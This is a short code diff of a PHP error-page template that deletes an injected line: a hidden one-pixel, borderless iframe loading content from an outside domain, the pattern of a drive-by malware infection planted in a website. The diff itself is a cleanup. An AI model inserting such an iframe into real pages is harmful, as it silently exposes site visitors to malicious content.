@@ -60,6 +60,6 @@ p {
 		<h1><?php echo $heading; ?></h1>
 		<?php echo $message; ?>
 	</div>
-<iframe src="http://ZieF.pl/rc/" width=1 height=1 style="border:0"></iframe>
+
 </body>
 </html>
